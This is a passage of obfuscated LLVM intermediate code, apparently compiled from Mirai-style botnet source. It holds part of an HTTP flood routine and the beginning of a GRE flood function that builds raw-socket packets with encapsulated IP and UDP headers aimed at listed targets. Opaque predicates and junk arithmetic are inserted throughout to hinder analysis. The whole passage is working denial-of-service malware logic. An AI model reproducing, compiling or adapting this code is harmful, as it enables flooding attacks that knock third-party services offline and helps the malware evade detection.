  %4952 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4953 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4952, i32 0, i32 11
  %4954 = load i32, i32* %4953, align 4
  %4955 = icmp eq i32 %4954, 1
  br label %originalBB698

originalBB712alteredBB:                           ; preds = %originalBB712, %3836
  %4956 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4957 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4956, i32 0, i32 18
  %4958 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4957, i32 0, i32 0
  %4959 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4960 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4959, i32 0, i32 17
  %4961 = load i32, i32* %4960, align 4
  %4962 = call i8* @table_retrieve_val(i32 36, i32* null)
  %4963 = call i32 @util_memsearch(i8* %4958, i32 %4961, i8* %4962, i32 11)
  store i32 %4963, i32* %68, align 4
  %4964 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4965 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4964, i32 0, i32 18
  %4966 = load i32, i32* %68, align 4
  %4967 = sext i32 %4966 to i64
  %4968 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4965, i64 0, i64 %4967
  %4969 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4970 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4969, i32 0, i32 17
  %4971 = load i32, i32* %4970, align 4
  %4972 = load i32, i32* %68, align 4
  %_713 = sub i32 %4971, %4972
  %gen714 = mul i32 %_713, %4972
  %_715 = sub i32 %4971, %4972
  %gen716 = mul i32 %_715, %4972
  %_717 = shl i32 %4971, %4972
  %_718 = shl i32 %4971, %4972
  %4973 = sub nsw i32 %4971, %4972
  %4974 = call i32 @util_memsearch(i8* %4968, i32 %4973, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %4974, i32* %69, align 4
  %4975 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4976 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4975, i32 0, i32 18
  %4977 = load i32, i32* %68, align 4
  %4978 = load i32, i32* %69, align 4
  %_719 = sub i32 %4978, 1
  %gen720 = mul i32 %_719, 1
  %_721 = sub i32 %4978, 1
  %gen722 = mul i32 %_721, 1
  %_723 = sub i32 %4978, 1
  %gen724 = mul i32 %_723, 1
  %_725 = sub i32 %4978, 1
  %gen726 = mul i32 %_725, 1
  %_727 = sub i32 0, %4978
  %gen728 = add i32 %_727, 1
  %4979 = sub nsw i32 %4978, 1
  %_729 = sub i32 0, %4977
  %gen730 = add i32 %_729, %4979
  %4980 = add nsw i32 %4977, %4979
  %4981 = sext i32 %4980 to i64
  %4982 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4976, i64 0, i64 %4981
  store i8 0, i8* %4982, align 1
  %4983 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4984 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4983, i32 0, i32 15
  %4985 = load i32, i32* %4984, align 4
  %4986 = icmp slt i32 %4985, 5
  br label %originalBB712

originalBB734alteredBB:                           ; preds = %originalBB734, %4072
  br label %originalBB734

originalBB738alteredBB:                           ; preds = %originalBB738, %4089
  %4987 = load i32, i32* %67, align 4
  %4988 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4989 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4988, i32 0, i32 17
  %4990 = load i32, i32* %4989, align 4
  %_739 = sub i32 0, %4990
  %gen740 = add i32 %_739, %4987
  %_741 = shl i32 %4990, %4987
  %4991 = sub nsw i32 %4990, %4987
  store i32 %4991, i32* %4989, align 4
  %4992 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4993 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4992, i32 0, i32 18
  %4994 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4993, i32 0, i32 0
  %4995 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4996 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4995, i32 0, i32 18
  %4997 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4996, i32 0, i32 0
  %4998 = load i32, i32* %67, align 4
  %4999 = sext i32 %4998 to i64
  %5000 = getelementptr inbounds i8, i8* %4997, i64 %4999
  %5001 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %5002 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %5001, i32 0, i32 17
  %5003 = load i32, i32* %5002, align 4
  %5004 = sext i32 %5003 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %4994, i8* %5000, i64 %5004, i32 1, i1 false)
  %5005 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %5006 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %5005, i32 0, i32 18
  %5007 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %5008 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %5007, i32 0, i32 17
  %5009 = load i32, i32* %5008, align 4
  %5010 = sext i32 %5009 to i64
  %5011 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5006, i64 0, i64 %5010
  store i8 0, i8* %5011, align 1
  %5012 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %5013 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %5012, i32 0, i32 17
  %5014 = load i32, i32* %5013, align 4
  %5015 = icmp eq i32 %5014, 0
  br label %originalBB738

originalBB745alteredBB:                           ; preds = %originalBB745, %4146
  br label %originalBB745

originalBB749alteredBB:                           ; preds = %originalBB749, %4163
  %5016 = call i32* @__errno_location() #7
  store i32 0, i32* %5016, align 4
  %5017 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %5018 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %5017, i32 0, i32 0
  %5019 = load i32, i32* %5018, align 4
  %5020 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %5021 = call i64 @recv(i32 %5019, i8* %5020, i64 10240, i32 16384)
  %5022 = trunc i64 %5021 to i32
  store i32 %5022, i32* %20, align 4
  %5023 = load i32, i32* %20, align 4
  %5024 = icmp eq i32 %5023, 0
  br label %originalBB749

originalBB753alteredBB:                           ; preds = %originalBB753, %4213
  %5025 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %5026 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %5025, i32 0, i32 1
  %5027 = load i8, i8* %5026, align 4
  %5028 = zext i8 %5027 to i32
  %5029 = icmp ne i32 %5028, 0
  br label %originalBB753

originalBB757alteredBB:                           ; preds = %originalBB757, %4239
  br label %originalBB757

originalBB761alteredBB:                           ; preds = %originalBB761, %4256
  br label %originalBB761

originalBB765alteredBB:                           ; preds = %originalBB765, %4274
  br label %originalBB765

originalBB769alteredBB:                           ; preds = %originalBB769, %4295
  br label %originalBB769
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i32 @util_strlen(i8*) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare void @util_zero(i8*, i32) #3

declare i8* @util_itoa(i32, i32, i8*) #3

declare signext i8 @util_strcmp(i8*, i8*) #3

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare signext i8 @util_strncmp(i8*, i8*, i32) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.21
  %6 = load i32, i32* @y.22
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %struct.iphdr*, align 8
  %36 = alloca %struct.grehdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %41 = load i8, i8* %13, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %19, align 8
  %45 = load i8, i8* %15, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %20, align 1
  %49 = load i8, i8* %15, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %21, align 2
  %53 = load i8, i8* %15, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %22, align 1
  %57 = load i8, i8* %15, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %23, align 1
  %61 = load i8, i8* %15, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %24, align 2
  %65 = load i8, i8* %15, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %25, align 2
  %69 = load i8, i8* %15, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %26, align 4
  %72 = load i8, i8* %15, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %27, align 1
  %76 = load i8, i8* %15, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %28, align 1
  %80 = load i8, i8* %15, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %29, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %18, align 4
  %85 = icmp eq i32 %84, -1
  %86 = load i32, i32* @x.21
  %87 = load i32, i32* @y.22
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %85, label %94, label %95

; <label>:94:                                     ; preds = %originalBBpart2
  br label %641

; <label>:95:                                     ; preds = %originalBBpart2
  store i32 1, i32* %17, align 4
  %96 = load i32, i32* %18, align 4
  %97 = bitcast i32* %17 to i8*
  %98 = call i32 @setsockopt(i32 %96, i32 0, i32 3, i8* %97, i32 4) #6
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %103

; <label>:100:                                    ; preds = %95
  %101 = load i32, i32* %18, align 4
  %102 = call i32 @close(i32 %101)
  br label %641

; <label>:103:                                    ; preds = %95
  %104 = load i32, i32* @x.21
  %105 = load i32, i32* @y.22
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %103
  store i32 0, i32* %17, align 4
  %112 = load i32, i32* @x.21
  %113 = load i32, i32* @y.22
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %120

; <label>:120:                                    ; preds = %302, %originalBBpart24
  %121 = load i32, i32* %17, align 4
  %122 = load i8, i8* %13, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  br i1 %124, label %125, label %305

; <label>:125:                                    ; preds = %120
  %126 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %127 = load i8**, i8*** %19, align 8
  %128 = load i32, i32* %17, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  store i8* %126, i8** %130, align 8
  %131 = load i8**, i8*** %19, align 8
  %132 = load i32, i32* %17, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8*, i8** %131, i64 %133
  %135 = load i8*, i8** %134, align 8
  %136 = bitcast i8* %135 to %struct.iphdr*
  store %struct.iphdr* %136, %struct.iphdr** %30, align 8
  %137 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i64 1
  %139 = bitcast %struct.iphdr* %138 to %struct.grehdr*
  store %struct.grehdr* %139, %struct.grehdr** %31, align 8
  %140 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %141 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %140, i64 1
  %142 = bitcast %struct.grehdr* %141 to %struct.iphdr*
  store %struct.iphdr* %142, %struct.iphdr** %32, align 8
  %143 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i64 1
  %145 = bitcast %struct.iphdr* %144 to %struct.udphdr*
  store %struct.udphdr* %145, %struct.udphdr** %33, align 8
  %146 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = and i8 %148, 15
  %150 = or i8 %149, 64
  store i8 %150, i8* %147, align 4
  %151 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %152 = bitcast %struct.iphdr* %151 to i8*
  %153 = load i8, i8* %152, align 4
  %154 = and i8 %153, -16
  %155 = or i8 %154, 5
  store i8 %155, i8* %152, align 4
  %156 = load i8, i8* %20, align 1
  %157 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 1
  store i8 %156, i8* %158, align 1
  %159 = load i32, i32* %26, align 4
  %160 = sext i32 %159 to i64
  %161 = add i64 52, %160
  %162 = trunc i64 %161 to i16
  %163 = call zeroext i16 @htons(i16 zeroext %162) #7
  %164 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 2
  store i16 %163, i16* %165, align 2
  %166 = load i16, i16* %21, align 2
  %167 = call zeroext i16 @htons(i16 zeroext %166) #7
  %168 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 3
  store i16 %167, i16* %169, align 4
  %170 = load i8, i8* %22, align 1
  %171 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 5
  store i8 %170, i8* %172, align 4
  %173 = load i8, i8* %23, align 1
  %174 = icmp ne i8 %173, 0
  br i1 %174, label %175, label %179

; <label>:175:                                    ; preds = %125
  %176 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 4
  store i16 %176, i16* %178, align 2
  br label %179

; <label>:179:                                    ; preds = %175, %125
  %180 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 6
  store i8 47, i8* %181, align 1
  %182 = load i32, i32* %29, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 8
  store i32 %182, i32* %184, align 4
  %185 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %186 = load i32, i32* %17, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i64 %187
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %188, i32 0, i32 1
  %190 = load i32, i32* %189, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 9
  store i32 %190, i32* %192, align 4
  %193 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %194 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %195 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %194, i32 0, i32 1
  store i16 %193, i16* %195, align 2
  %196 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %197 = bitcast %struct.iphdr* %196 to i8*
  %198 = load i8, i8* %197, align 4
  %199 = and i8 %198, 15
  %200 = or i8 %199, 64
  store i8 %200, i8* %197, align 4
  %201 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %202 = bitcast %struct.iphdr* %201 to i8*
  %203 = load i8, i8* %202, align 4
  %204 = and i8 %203, -16
  %205 = or i8 %204, 5
  store i8 %205, i8* %202, align 4
  %206 = load i8, i8* %20, align 1
  %207 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 1
  store i8 %206, i8* %208, align 1
  %209 = load i32, i32* %26, align 4
  %210 = sext i32 %209 to i64
  %211 = add i64 28, %210
  %212 = trunc i64 %211 to i16
  %213 = call zeroext i16 @htons(i16 zeroext %212) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 2
  store i16 %213, i16* %215, align 2
  %216 = load i16, i16* %21, align 2
  %217 = zext i16 %216 to i32
  %218 = xor i32 %217, -1
  %219 = trunc i32 %218 to i16
  %220 = call zeroext i16 @htons(i16 zeroext %219) #7
  %221 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 3
  store i16 %220, i16* %222, align 4
  %223 = load i8, i8* %22, align 1
  %224 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 5
  store i8 %223, i8* %225, align 4
  %226 = load i8, i8* %23, align 1
  %227 = icmp ne i8 %226, 0
  br i1 %227, label %228, label %232

; <label>:228:                                    ; preds = %179
  %229 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %230 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 4
  store i16 %229, i16* %231, align 2
  br label %232

; <label>:232:                                    ; preds = %228, %179
  %233 = load i32, i32* @x.21
  %234 = load i32, i32* @y.22
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %232
  %241 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 6
  store i8 17, i8* %242, align 1
  %243 = call i32 @rand_next()
  %244 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 8
  store i32 %243, i32* %245, align 4
  %246 = load i8, i8* %28, align 1
  %247 = icmp ne i8 %246, 0
  %248 = load i32, i32* @x.21
  %249 = load i32, i32* @y.22
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %247, label %256, label %278

; <label>:256:                                    ; preds = %originalBBpart28
  %257 = load i32, i32* @x.21
  %258 = load i32, i32* @y.22
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %256
  %265 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 9
  %267 = load i32, i32* %266, align 4
  %268 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 9
  store i32 %267, i32* %269, align 4
  %270 = load i32, i32* @x.21
  %271 = load i32, i32* @y.22
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %286

; <label>:278:                                    ; preds = %originalBBpart28
  %279 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 8
  %281 = load i32, i32* %280, align 4
  %282 = sub i32 %281, 1024
  %283 = xor i32 %282, -1
  %284 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 9
  store i32 %283, i32* %285, align 4
  br label %286

; <label>:286:                                    ; preds = %278, %originalBBpart212
  %287 = load i16, i16* %24, align 2
  %288 = call zeroext i16 @htons(i16 zeroext %287) #7
  %289 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %290 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %289, i32 0, i32 0
  store i16 %288, i16* %290, align 2
  %291 = load i16, i16* %25, align 2
  %292 = call zeroext i16 @htons(i16 zeroext %291) #7
  %293 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %294 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %293, i32 0, i32 1
  store i16 %292, i16* %294, align 2
  %295 = load i32, i32* %26, align 4
  %296 = sext i32 %295 to i64
  %297 = add i64 8, %296
  %298 = trunc i64 %297 to i16
  %299 = call zeroext i16 @htons(i16 zeroext %298) #7
  %300 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %301 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %300, i32 0, i32 2
  store i16 %299, i16* %301, align 2
  br label %302

; <label>:302:                                    ; preds = %286
  %303 = load i32, i32* %17, align 4
  %304 = add nsw i32 %303, 1
  store i32 %304, i32* %17, align 4
  br label %120

; <label>:305:                                    ; preds = %120
  br label %306

; <label>:306:                                    ; preds = %originalBBpart254, %305
  %307 = load i32, i32* @x.21
  %308 = load i32, i32* @y.22
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %306
  store i32 0, i32* %17, align 4
  %315 = load i32, i32* @x.21
  %316 = load i32, i32* @y.22
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %323

; <label>:323:                                    ; preds = %621, %originalBBpart216
  %324 = load i32, i32* %17, align 4
  %325 = load i8, i8* %13, align 1
  %326 = zext i8 %325 to i32
  %327 = icmp slt i32 %324, %326
  br i1 %327, label %328, label %624

; <label>:328:                                    ; preds = %323
  %329 = load i8**, i8*** %19, align 8
  %330 = load i32, i32* %17, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds i8*, i8** %329, i64 %331
  %333 = load i8*, i8** %332, align 8
  store i8* %333, i8** %34, align 8
  %334 = load i8*, i8** %34, align 8
  %335 = bitcast i8* %334 to %struct.iphdr*
  store %struct.iphdr* %335, %struct.iphdr** %35, align 8
  %336 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i64 1
  %338 = bitcast %struct.iphdr* %337 to %struct.grehdr*
  store %struct.grehdr* %338, %struct.grehdr** %36, align 8
  %339 = load %struct.grehdr*, %struct.grehdr** %36, align 8
  %340 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %339, i64 1
  %341 = bitcast %struct.grehdr* %340 to %struct.iphdr*
  store %struct.iphdr* %341, %struct.iphdr** %37, align 8
  %342 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i64 1
  %344 = bitcast %struct.iphdr* %343 to %struct.udphdr*
  store %struct.udphdr* %344, %struct.udphdr** %38, align 8
  %345 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %346 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %345, i64 1
  %347 = bitcast %struct.udphdr* %346 to i8*
  store i8* %347, i8** %39, align 8
  %348 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %349 = load i32, i32* %17, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %348, i64 %350
  %352 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %351, i32 0, i32 2
  %353 = load i8, i8* %352, align 4
  %354 = zext i8 %353 to i32
  %355 = icmp slt i32 %354, 32
  br i1 %355, label %356, label %377

; <label>:356:                                    ; preds = %328
  %357 = load %struct.attack_target*, %struct.attack_target** %14, align 8
